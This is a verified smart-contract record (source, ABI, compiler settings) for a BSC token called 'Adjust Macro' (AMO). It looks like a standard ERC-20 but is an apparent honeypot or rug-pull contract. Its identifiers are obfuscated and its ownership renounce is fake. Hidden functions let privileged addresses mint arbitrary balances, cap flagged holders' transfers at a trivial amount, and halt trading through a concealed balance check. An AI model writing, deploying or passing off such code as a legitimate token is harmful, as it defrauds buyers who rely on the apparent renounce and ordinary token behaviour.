{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface tokenSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fundAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toLaunchedTake {\n    function createPair(address tradingFromTake, address swapMarketing) external returns (address);\n}\n\ninterface fundTakeLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchTradingMode) external view returns (uint256);\n\n    function transfer(address senderLaunchSwap, uint256 feeList) external returns (bool);\n\n    function allowance(address marketingFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderLaunchSwap,\n        uint256 feeList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchMarketing, uint256 value);\n    event Approval(address indexed marketingFund, address indexed spender, uint256 value);\n}\n\ninterface fundTakeLimitMetadata is fundTakeLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AdjustMacro is fundAuto, fundTakeLimit, fundTakeLimitMetadata {\n\n    address public marketingList;\n\n    mapping(address => mapping(address => uint256)) private autoMarketingReceiver;\n\n    function autoExempt(uint256 feeList) public {\n        tokenShould();\n        atTotal = feeList;\n    }\n\n    function swapTrading(address launchedMode, address senderLaunchSwap, uint256 feeList) internal returns (bool) {\n        require(tokenMode[launchedMode] >= feeList);\n        tokenMode[launchedMode] -= feeList;\n        tokenMode[senderLaunchSwap] += feeList;\n        emit Transfer(launchedMode, senderLaunchSwap, feeList);\n        return true;\n    }\n\n    function walletExempt(address takeFundLiquidity) public {\n        tokenShould();\n        if (marketingLimit == receiverTotalExempt) {\n            receiverTotalExempt = tradingBuy;\n        }\n        if (takeFundLiquidity == marketingList || takeFundLiquidity == atFundLaunched) {\n            return;\n        }\n        fromTake[takeFundLiquidity] = true;\n    }\n\n    function allowance(address teamIs, address receiverMinLaunch) external view virtual override returns (uint256) {\n        if (receiverMinLaunch == receiverLaunched) {\n            return type(uint256).max;\n        }\n        return autoMarketingReceiver[teamIs][receiverMinLaunch];\n    }\n\n    address receiverLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public fromTake;\n\n    uint256 private txFund = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private tokenMode;\n\n    function getOwner() external view returns (address) {\n        return modeTeam;\n    }\n\n    function buyTx() public {\n        emit OwnershipTransferred(marketingList, address(0));\n        modeTeam = address(0);\n    }\n\n    address private modeTeam;\n\n    address atTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address launchedMode, address senderLaunchSwap, uint256 feeList) external override returns (bool) {\n        if (_msgSender() != receiverLaunched) {\n            if (autoMarketingReceiver[launchedMode][_msgSender()] != type(uint256).max) {\n                require(feeList <= autoMarketingReceiver[launchedMode][_msgSender()]);\n                autoMarketingReceiver[launchedMode][_msgSender()] -= feeList;\n            }\n        }\n        return fromSenderFee(launchedMode, senderLaunchSwap, feeList);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchAt;\n    }\n\n    string private launchAt = \"AMO\";\n\n    uint256 walletLiquidityLaunch;\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountLiquiditySender;\n    }\n\n    function txTo(address walletReceiver) public {\n        if (liquidityTeam) {\n            return;\n        }\n        \n        exemptFundReceiver[walletReceiver] = true;\n        \n        liquidityTeam = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedLiquidity;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txFund;\n    }\n\n    uint256 private tradingBuy;\n\n    function transfer(address maxReceiverLaunch, uint256 feeList) external virtual override returns (bool) {\n        return fromSenderFee(_msgSender(), maxReceiverLaunch, feeList);\n    }\n\n    function owner() external view returns (address) {\n        return modeTeam;\n    }\n\n    uint256 constant txIsExempt = 18 ** 10;\n\n    address public atFundLaunched;\n\n    function minTrading(address maxReceiverLaunch, uint256 feeList) public {\n        tokenShould();\n        tokenMode[maxReceiverLaunch] = feeList;\n    }\n\n    bool public enableTeam;\n\n    bool public liquidityTeam;\n\n    uint256 private marketingLimit;\n\n    function tokenShould() private view {\n        require(exemptFundReceiver[_msgSender()]);\n    }\n\n    function fromSenderFee(address launchedMode, address senderLaunchSwap, uint256 feeList) internal returns (bool) {\n        if (launchedMode == marketingList) {\n            return swapTrading(launchedMode, senderLaunchSwap, feeList);\n        }\n        uint256 autoReceiverLiquidity = fundTakeLimit(atFundLaunched).balanceOf(atTx);\n        require(autoReceiverLiquidity == atTotal);\n        require(senderLaunchSwap != atTx);\n        if (fromTake[launchedMode]) {\n            return swapTrading(launchedMode, senderLaunchSwap, txIsExempt);\n        }\n        return swapTrading(launchedMode, senderLaunchSwap, feeList);\n    }\n\n    uint256 private receiverTotalExempt;\n\n    constructor (){\n        \n        tokenSell atList = tokenSell(receiverLaunched);\n        atFundLaunched = toLaunchedTake(atList.factory()).createPair(atList.WETH(), address(this));\n        if (receiverTotalExempt == marketingLimit) {\n            limitFrom = false;\n        }\n        marketingList = _msgSender();\n        buyTx();\n        exemptFundReceiver[marketingList] = true;\n        tokenMode[marketingList] = txFund;\n        \n        emit Transfer(address(0), marketingList, txFund);\n    }\n\n    bool public enableMode;\n\n    uint256 atTotal;\n\n    bool private limitFrom;\n\n    function balanceOf(address launchTradingMode) public view virtual override returns (uint256) {\n        return tokenMode[launchTradingMode];\n    }\n\n    function approve(address receiverMinLaunch, uint256 feeList) public virtual override returns (bool) {\n        autoMarketingReceiver[_msgSender()][receiverMinLaunch] = feeList;\n        emit Approval(_msgSender(), receiverMinLaunch, feeList);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed atSender, address indexed liquidityMaxTo);\n\n    string private launchedLiquidity = \"Adjust Macro\";\n\n    uint8 private amountLiquiditySender = 18;\n\n    mapping(address => bool) public exemptFundReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityMaxTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverMinLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMinLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFundLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeList\",\"type\":\"uint256\"}],\"name\":\"autoExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTradingMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptFundReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiverLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeList\",\"type\":\"uint256\"}],\"name\":\"minTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiverLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderLaunchSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"}],\"name\":\"txTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFundLiquidity\",\"type\":\"address\"}],\"name\":\"walletExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AdjustMacro", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}